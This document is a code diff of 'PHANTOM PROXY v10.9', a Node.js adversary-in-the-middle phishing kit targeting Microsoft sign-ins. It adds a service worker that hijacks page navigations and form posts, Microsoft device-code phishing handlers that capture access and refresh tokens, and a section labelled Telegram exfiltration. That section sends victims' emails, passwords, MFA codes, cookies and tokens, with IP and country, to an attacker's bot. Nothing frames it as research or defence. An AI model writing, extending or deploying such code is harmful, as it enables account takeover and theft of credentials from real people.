@@ -1,6 +1,17 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.9 — Full Dashboard API + Plain‑Text Fix
+// 🥔 PHANTOM PROXY v10.9 — Full Dashboard API + Plain-Text Page-Load
 // ============================================================
+// 🔥 NO EXPRESS — pure Node.js
+// ✅ Service Worker injection + serving FIXED
+// ✅ HTTP/1.1 forced to prevent h2 errors
+// ✅ Health check endpoint added
+// ✅ Proxy routing FIXED
+// ✅ WebSocket FIXED (order + path)
+// ✅ Visit logging for BOTH AiTM links AND device page
+// ✅ Telegram notifications with country flags, type split, and plain-text page-load
+// ✅ Dashboard API FULLY DEFINED
+// ============================================================
+
 const http = require("http");
 const https = require("https");
 const path = require("path");
@@ -9,18 +20,22 @@ const zlib = require("zlib");
 const crypto = require("crypto");
 const os = require("os");
 
+// ── ✅ SAFE REQUIRE ──
 let axios, AdmZip, WebSocket, FormData;
 try { axios = require('axios'); } catch (e) { axios = null; }
 try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
+// ── ✅ TELEGRAM CONFIG — FROM ENVIRONMENT ──
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
+// ── ✅ DASHBOARD AUTH ──
 const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
 const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
+// ── ✅ CONSTANTS ──
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
@@ -55,6 +70,7 @@ const VICTIM_SESSIONS = {};
 let deviceFlows = [];
 let prtStorage = { prts: [], lastScan: null };
 
+// ── ✅ CACHE MANAGER ──
 class CacheManager {
     constructor(ttl = 300000) {
         this.cache = new Map();
@@ -82,6 +98,7 @@ class CacheManager {
 }
 global._cache = new CacheManager(300000);
 
+// ── ✅ RETRY LOGIC ──
 async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
     let lastError;
     let currentDelay = delay;
@@ -97,6 +114,7 @@ async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
     throw lastError;
 }
 
+// ── ✅ USER-AGENT ROTATION ──
 const USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -105,6 +123,7 @@ const USER_AGENTS = [
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
+// ── 📝 MARKDOWN ESCAPE ──
 function escapeMarkdown(text) {
     if (!text) return '';
     const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
@@ -115,8 +134,9 @@ function escapeMarkdown(text) {
     return escaped;
 }
 
+// ── 🌍 COUNTRY FLAG CACHE ──
 const countryCache = new Map();
-const COUNTRY_CACHE_TTL = 3600000;
+const COUNTRY_CACHE_TTL = 3600000; // 1 hour
 
 async function getCountryInfo(ip) {
     if (!ip || ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
@@ -124,6 +144,7 @@ async function getCountryInfo(ip) {
     }
     const cached = countryCache.get(ip);
     if (cached && Date.now() < cached.expiry) return cached.data;
+    
     try {
         const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
         const data = response.data;
@@ -137,13 +158,27 @@ async function getCountryInfo(ip) {
     return { code: 'UN', flag: '🌍', name: 'Unknown' };
 }
 
+// ── 🔥 VISIT LOGGER ──
 function logVisit(req, pageType = 'page') {
     try {
-        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+        const ip = req.headers['cf-connecting-ip'] || 
+                   req.headers['x-real-ip'] || 
+                   req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
         const url = req.url || '/';
-        const visitEntry = { timestamp: new Date().toISOString(), ip, userAgent, referer, url, pageType, countryCode: 'UN' };
+        
+        const visitEntry = {
+            timestamp: new Date().toISOString(),
+            ip,
+            userAgent,
+            referer,
+            url,
+            pageType,
+            countryCode: 'UN'
+        };
+        
         if (axios && ip !== 'Unknown') {
             axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
                 .then(res => {
@@ -159,12 +194,16 @@ function logVisit(req, pageType = 'page') {
         } else {
             fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
         }
+        
         console.log(`👁️ Visit logged: ${pageType} | IP: ${ip} | URL: ${url}`);
     } catch (e) {
         console.error('Visit log error:', e.message);
     }
 }
 
+// ============================================================
+// 📤 TELEGRAM EXFILTRATION
+// ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
     try {
@@ -181,7 +220,10 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
         form.append('chat_id', CHAT_ID);
         form.append('document', fs.createReadStream(filePath), { filename });
         form.append('caption', `🔑 Tokens file: ${filename}`);
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders(), timeout: 10000 });
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
         try { fs.unlinkSync(filePath); } catch (e) {}
         console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
     } catch (e) { console.error('Telegram tokens file failed:', e.message); }
@@ -200,7 +242,10 @@ async function sendCookiesFile(cookies, sessionId) {
         form.append('chat_id', CHAT_ID);
         form.append('document', fs.createReadStream(filePath), { filename });
         form.append('caption', `🍪 Cookies: ${filename}`);
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders(), timeout: 10000 });
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 10000
+        });
         try { fs.unlinkSync(filePath); } catch (e) {}
         console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
     } catch (e) { console.error('Telegram cookies file failed:', e.message); }
@@ -229,10 +274,17 @@ async function sendToTelegram(data, type = 'capture', ip = null) {
 
         let header;
         switch (type) {
-            case 'aitm': header = '🔐 **AiTM Credential Capture!**'; break;
-            case 'device': header = '📱 **Device Code Token Capture!**'; break;
-            case 'prt': header = '🔄 **PRT Token Exchange!**'; break;
-            default: header = '🔐 **LOGIN CAPTURED!**';
+            case 'aitm':
+                header = '🔐 **AiTM Credential Capture!**';
+                break;
+            case 'device':
+                header = '📱 **Device Code Token Capture!**';
+                break;
+            case 'prt':
+                header = '🔄 **PRT Token Exchange!**';
+                break;
+            default:
+                header = '🔐 **LOGIN CAPTURED!**';
         }
 
         let message = `${header}\n\n${countryInfo.flag} **${escapeMarkdown(countryInfo.name)}** (${countryInfo.code})\n👤 Email: ${escapeMarkdown(email)}\n🔐 Password: ${escapeMarkdown(password)}\n📱 MFA: ${escapeMarkdown(mfa)}\n🆔 Session: ${escapeMarkdown(sessionId)}\n🕒 Time: ${new Date().toISOString()}`;
@@ -267,7 +319,9 @@ async function sendToTelegram(data, type = 'capture', ip = null) {
     }
 }
 
-// ── Proxy helpers ──
+// ============================================================
+// 🧩 PROXY HELPERS (unchanged)
+// ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
     const cookies = requestCookies.split("; ");
@@ -344,6 +398,7 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     }
 }
 
+// ── Cookie management (unchanged) ──
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
     if (sCookie.length < 2) return false;
@@ -511,6 +566,7 @@ function deleteHTTPSecurityResponseHeaders(headers) {
     for (const h of secHeaders) delete headers[h];
 }
 
+// ── Compression / injection ──
 function decompressData(data, encoding) {
     const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
     return new Promise((resolve, reject) => {
@@ -586,7 +642,127 @@ if (!fs.existsSync(scriptFile)) {
     console.log('✅ Created dummy script.js');
 }
 
-const serviceWorkerCode = `// ... (same as before) ...`; // For brevity, same as earlier
+// ── 🔥 CREATE SERVICE WORKER FILE ──
+const serviceWorkerCode = `// 🔥 PHANTOM SERVICE WORKER v10.4
+const CACHE_NAME = 'phantom-cache-v10.4';
+const PROXY_HOST = self.location.host;
+const PROXY_PATH = '/lNv1pC9AWPUY4gbidyBO';
+const SCRIPT_PATH = '/@';
+const JSCOOKIE_PATH = '/JSCookie_6X7dRqLg90mH';
+const MUTATION_PATH = '/Mutation_o5y3f4O7jMGW';
+
+self.addEventListener('install', (event) => {
+    console.log('🔥 PHANTOM SW: Installing...');
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    console.log('🔥 PHANTOM SW: Activated!');
+    event.waitUntil(self.clients.claim());
+    caches.keys().then(names => {
+        names.forEach(name => { if (name !== CACHE_NAME) caches.delete(name); });
+    });
+});
+
+function rewriteUrl(url) {
+    const urlObj = new URL(url);
+    if (urlObj.host === PROXY_HOST) return url;
+    const proxyUrl = new URL(PROXY_PATH, self.location.origin);
+    proxyUrl.searchParams.set('url', url);
+    return proxyUrl.toString();
+}
+
+function mutateCredentials(body) {
+    try {
+        const params = new URLSearchParams(body);
+        const email = params.get('login') || params.get('username') || params.get('loginfmt') || params.get('email');
+        const password = params.get('passwd') || params.get('password');
+        if (email && password) console.log('🔑 PHANTOM SW: Credentials captured!');
+    } catch(e) {}
+    return body;
+}
+
+self.addEventListener('fetch', (event) => {
+    const url = new URL(event.request.url);
+    if (url.pathname === '/service_worker_Mz8XO2ny1Pg5.js') return;
+    if (url.pathname === SCRIPT_PATH) return;
+    if (url.pathname === PROXY_PATH) return;
+
+    event.respondWith(
+        (async () => {
+            try {
+                let proxyUrl;
+                if (event.request.mode === 'navigate') {
+                    proxyUrl = rewriteUrl(event.request.url);
+                    const init = {
+                        method: 'GET',
+                        headers: new Headers(event.request.headers),
+                        mode: 'cors',
+                        credentials: 'include'
+                    };
+                    const response = await fetch(proxyUrl, init);
+                    console.log('✅ PHANTOM SW: Proxied navigation to', event.request.url);
+                    return response;
+                }
+                if (event.request.method === 'POST') {
+                    let body = await event.request.text();
+                    const cookieSend = await fetch(new URL(JSCOOKIE_PATH, self.location.origin), {
+                        method: 'POST',
+                        body: body,
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                    });
+                    body = mutateCredentials(body);
+                    proxyUrl = new URL(MUTATION_PATH, self.location.origin);
+                    proxyUrl.searchParams.set('redirect_urI', event.request.url);
+                    const init = {
+                        method: 'POST',
+                        body: body,
+                        headers: new Headers(event.request.headers),
+                        mode: 'cors',
+                        credentials: 'include'
+                    };
+                    const response = await fetch(proxyUrl, init);
+                    console.log('📤 PHANTOM SW: Proxied POST to', event.request.url);
+                    return response;
+                }
+                proxyUrl = rewriteUrl(event.request.url);
+                const init = {
+                    method: event.request.method,
+                    headers: new Headers(event.request.headers),
+                    mode: 'cors',
+                    credentials: 'include'
+                };
+                const response = await fetch(proxyUrl, init);
+                return response;
+            } catch (error) {
+                console.error('❌ PHANTOM SW: Fetch error:', error);
+                return fetch(event.request);
+            }
+        })()
+    );
+});
+
+self.addEventListener('push', (event) => {
+    if (event.data) {
+        const data = event.data.json();
+        self.registration.showNotification(data.title, {
+            body: data.body,
+            icon: '/favicon.ico',
+            badge: '/favicon.ico',
+            data: data.url
+        });
+    }
+});
+
+self.addEventListener('notificationclick', (event) => {
+    event.notification.close();
+    if (event.notification.data) {
+        event.waitUntil(clients.openWindow(event.notification.data));
+    }
+});
+
+console.log('🔥 PHANTOM Service Worker v10.4 — Fully Armed & Operational');`;
+
 if (!fs.existsSync(swFilePath)) {
     fs.writeFileSync(swFilePath, serviceWorkerCode);
     console.log('✅ Created service_worker_Mz8XO2ny1Pg5.js');
@@ -602,6 +778,7 @@ class TokenVault {
         this.tokens = [];
         this.scanLogs();
     }
+
     extractUsernameFromToken(token) {
         try {
             const parts = token.split('.');
@@ -612,6 +789,7 @@ class TokenVault {
         } catch (e) {}
         return 'unknown';
     }
+
     scanLogs() {
         this.tokens = [];
         const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
@@ -657,6 +835,7 @@ class TokenVault {
         }
         return this.tokens;
     }
+
     getStats() {
         return {
             total: this.tokens.length,
@@ -666,6 +845,7 @@ class TokenVault {
             prt: this.tokens.filter(t => t.type === 'prt').length
         };
     }
+
     async healthCheckAll() {
         const results = [];
         const uniqueTokens = [];
@@ -701,6 +881,7 @@ class TokenVault {
         }
         return results;
     }
+
     async exchangeToken(tokenValue) {
         try {
             const response = await retry(async () => {
@@ -724,6 +905,9 @@ class TokenVault {
 
 const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
 
+// ============================================================
+// 🔄 AUTO-REFRESH DAEMON
+// ============================================================
 async function refreshTokensDaemon() {
     console.log('🔄 Token Refresh Daemon started (every 30 min)');
     setInterval(async () => {
@@ -798,6 +982,9 @@ class GraphClient {
     }
 }
 
+// ============================================================
+// 🛡️ DASHBOARD AUTH MIDDLEWARE
+// ============================================================
 function requireAuth(req, res) {
     const auth = req.headers.authorization;
     if (!auth) {
@@ -814,7 +1001,217 @@ function requireAuth(req, res) {
 }
 
 // ============================================================
-// 🔧 FULL DASHBOARD API HANDLER
+// 🌐 MAIN PROXY SERVER
+// ============================================================
+const server = http.createServer(async (req, res) => {
+    const { method, url } = req;
+
+    // ── 🔥 HEALTH CHECK ──
+    if (url === '/' || url === '/health') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ status: 'healthy', version: '10.9', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        return;
+    }
+
+    // ── 🔥 TEST ENDPOINT (for debugging) ──
+    if (url === '/test-telegram-now') {
+        try {
+            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: '✅ Test from PHANTOM at ' + new Date().toISOString()
+            });
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('Telegram test sent: ' + JSON.stringify(response.data));
+        } catch (e) {
+            console.error('Test error:', e.response?.data || e.message);
+            res.writeHead(500);
+            res.end('Error: ' + (e.response?.data?.description || e.message));
+        }
+        return;
+    }
+
+    // ── 🔥 DEVICE CODE PAGES ──
+    if (url === '/device' || url === '/device/') {
+        logVisit(req, 'device');
+
+        (async () => {
+            try {
+                const ip = req.headers['cf-connecting-ip'] || 
+                           req.headers['x-real-ip'] || 
+                           req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                           'Unknown';
+                const country = await getCountryInfo(ip);
+                const escapedUrl = escapeMarkdown(req.url);
+                const escapedUserAgent = escapeMarkdown(req.headers['user-agent'] || 'Unknown');
+                const message = `${country.flag} **Device Page Visit!**\n\n🌍 IP: ${ip} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Device visit notification sent.');
+            } catch (e) {
+                console.error('❌ Device visit notification failed:', e.message);
+                if (e.response) console.error('📛 Telegram API response:', e.response.data);
+            }
+        })();
+
+        const devicePath = path.join(__dirname, 'public', 'device_code.html');
+        if (fs.existsSync(devicePath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(devicePath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
+        }
+        return;
+    }
+
+    // ── 🔥 DEVICE CODE API ──
+    if (url === '/device/request' && method === 'POST') {
+        handleDeviceCodeRequest(req, res);
+        return;
+    }
+    if (url === '/device/token' && method === 'POST') {
+        handleDeviceCodeToken(req, res);
+        return;
+    }
+
+    // ── Dashboard HTML ──
+    if (url === '/dash' || url === '/dash/') {
+        if (!requireAuth(req, res)) return;
+        const dashPath = path.join(__dirname, 'public', 'index.html');
+        if (fs.existsSync(dashPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(dashPath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
+        }
+        return;
+    }
+
+    // ── Dashboard API ──
+    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
+        if (!requireAuth(req, res)) return;
+        await handleDashboardAPI(req, res);
+        return;
+    }
+
+    // ── Proxy ──
+    proxyHandler(req, res);
+});
+
+// ============================================================
+// 🔥 DEVICE CODE REQUEST HANDLER
+// ============================================================
+async function handleDeviceCodeRequest(req, res) {
+    if (!axios) {
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'server_error', error_description: 'axios not installed' }));
+        return;
+    }
+    try {
+        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        const data = response.data;
+        const flow = {
+            device_code: data.device_code,
+            user_code: data.user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            client_id: clientId,
+            session_id: crypto.randomBytes(16).toString('hex')
+        };
+        deviceFlows.push(flow);
+        saveDeviceFlows();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(data));
+    } catch (error) {
+        console.error('Device code request error:', error.response?.data || error.message);
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
+    }
+}
+
+// ============================================================
+// 🔥 DEVICE CODE TOKEN HANDLER
+// ============================================================
+async function handleDeviceCodeToken(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+        try {
+            const { device_code } = JSON.parse(body);
+            if (!device_code) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
+                return;
+            }
+            const flow = deviceFlows.find(f => f.device_code === device_code);
+            const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: clientId,
+                    device_code,
+                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            );
+            const tokens = response.data;
+            if (flow) {
+                flow.status = 'approved';
+                flow.access_token = tokens.access_token;
+                flow.refresh_token = tokens.refresh_token;
+                flow.id_token = tokens.id_token;
+                flow.approved = new Date().toISOString();
+                saveDeviceFlows();
+
+                try {
+                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+                    await sendToTelegram({
+                        sessionId: flow.session_id || 'device',
+                        email: 'Device Code Flow',
+                        password: 'N/A',
+                        mfa: 'N/A',
+                        tokens: {
+                            access_token: tokens.access_token,
+                            refresh_token: tokens.refresh_token,
+                            id_token: tokens.id_token
+                        },
+                        cookies: {}
+                    }, 'device', ip);
+                    console.log('✅ Device token capture notification sent.');
+                } catch (e) {
+                    console.error('❌ Device token capture notification failed:', e.message);
+                }
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(tokens));
+        } catch (error) {
+            if (error.response?.data?.error === 'authorization_pending') {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'authorization_pending' }));
+            } else if (error.response?.data?.error === 'expired_token') {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'expired_token' }));
+            } else {
+                console.error('Device token error:', error.response?.data || error.message);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
+            }
+        }
+    });
+}
+
+// ============================================================
+// 🔧 DASHBOARD API HANDLER (FULL)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1017,6 +1414,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // Device Code (dashboard-authenticated versions)
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -1848,204 +2246,8 @@ async function handleDashboardAPI(req, res) {
 }
 
 // ============================================================
-// 🌐 MAIN PROXY SERVER
+// 🔧 PROXY HANDLER
 // ============================================================
-const server = http.createServer(async (req, res) => {
-    const { method, url } = req;
-
-    if (url === '/' || url === '/health') {
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.9', uptime: process.uptime(), timestamp: new Date().toISOString() }));
-        return;
-    }
-
-    // Test endpoint
-    if (url === '/test-telegram-now') {
-        try {
-            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: '✅ Test from PHANTOM at ' + new Date().toISOString()
-            });
-            res.writeHead(200, { 'Content-Type': 'text/plain' });
-            res.end('Telegram test sent: ' + JSON.stringify(response.data));
-        } catch (e) {
-            console.error('Test error:', e.response?.data || e.message);
-            res.writeHead(500);
-            res.end('Error: ' + (e.response?.data?.description || e.message));
-        }
-        return;
-    }
-
-    // Device page
-    if (url === '/device' || url === '/device/') {
-        logVisit(req, 'device');
-        (async () => {
-            try {
-                const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
-                const country = await getCountryInfo(ip);
-                const escapedUrl = escapeMarkdown(req.url);
-                const escapedUserAgent = escapeMarkdown(req.headers['user-agent'] || 'Unknown');
-                const message = `${country.flag} **Device Page Visit!**\n\n🌍 IP: ${ip} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                });
-                console.log('✅ Device visit notification sent.');
-            } catch (e) {
-                console.error('❌ Device visit notification failed:', e.message);
-                if (e.response) console.error('📛 Telegram API response:', e.response.data);
-            }
-        })();
-        const devicePath = path.join(__dirname, 'public', 'device_code.html');
-        if (fs.existsSync(devicePath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(devicePath).pipe(res);
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
-        }
-        return;
-    }
-
-    // Device API
-    if (url === '/device/request' && method === 'POST') {
-        handleDeviceCodeRequest(req, res);
-        return;
-    }
-    if (url === '/device/token' && method === 'POST') {
-        handleDeviceCodeToken(req, res);
-        return;
-    }
-
-    // Dashboard
-    if (url === '/dash' || url === '/dash/') {
-        if (!requireAuth(req, res)) return;
-        const dashPath = path.join(__dirname, 'public', 'index.html');
-        if (fs.existsSync(dashPath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(dashPath).pipe(res);
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
-        }
-        return;
-    }
-
-    // Dashboard API
-    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
-        if (!requireAuth(req, res)) return;
-        await handleDashboardAPI(req, res);
-        return;
-    }
-
-    // Proxy
-    proxyHandler(req, res);
-});
-
-// ── Device code handlers ──
-async function handleDeviceCodeRequest(req, res) {
-    if (!axios) {
-        res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ error: 'server_error', error_description: 'axios not installed' }));
-        return;
-    }
-    try {
-        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
-            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-        );
-        const data = response.data;
-        const flow = {
-            device_code: data.device_code,
-            user_code: data.user_code,
-            verification_uri: data.verification_uri,
-            expires_in: data.expires_in,
-            interval: data.interval,
-            status: 'pending',
-            created: new Date().toISOString(),
-            client_id: clientId,
-            session_id: crypto.randomBytes(16).toString('hex')
-        };
-        deviceFlows.push(flow);
-        saveDeviceFlows();
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify(data));
-    } catch (error) {
-        console.error('Device code request error:', error.response?.data || error.message);
-        res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
-    }
-}
-
-async function handleDeviceCodeToken(req, res) {
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', async () => {
-        try {
-            const { device_code } = JSON.parse(body);
-            if (!device_code) {
-                res.writeHead(400, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
-                return;
-            }
-            const flow = deviceFlows.find(f => f.device_code === device_code);
-            const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                new URLSearchParams({
-                    client_id: clientId,
-                    device_code,
-                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-                }),
-                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-            );
-            const tokens = response.data;
-            if (flow) {
-                flow.status = 'approved';
-                flow.access_token = tokens.access_token;
-                flow.refresh_token = tokens.refresh_token;
-                flow.id_token = tokens.id_token;
-                flow.approved = new Date().toISOString();
-                saveDeviceFlows();
-                try {
-                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
-                    await sendToTelegram({
-                        sessionId: flow.session_id || 'device',
-                        email: 'Device Code Flow',
-                        password: 'N/A',
-                        mfa: 'N/A',
-                        tokens: {
-                            access_token: tokens.access_token,
-                            refresh_token: tokens.refresh_token,
-                            id_token: tokens.id_token
-                        },
-                        cookies: {}
-                    }, 'device', ip);
-                    console.log('✅ Device token capture notification sent.');
-                } catch (e) {
-                    console.error('❌ Device token capture notification failed:', e.message);
-                }
-            }
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify(tokens));
-        } catch (error) {
-            if (error.response?.data?.error === 'authorization_pending') {
-                res.writeHead(400, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'authorization_pending' }));
-            } else if (error.response?.data?.error === 'expired_token') {
-                res.writeHead(400, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'expired_token' }));
-            } else {
-                console.error('Device token error:', error.response?.data || error.message);
-                res.writeHead(500, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
-            }
-        }
-    });
-}
-
-// ── Proxy handler ──
 function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
 }
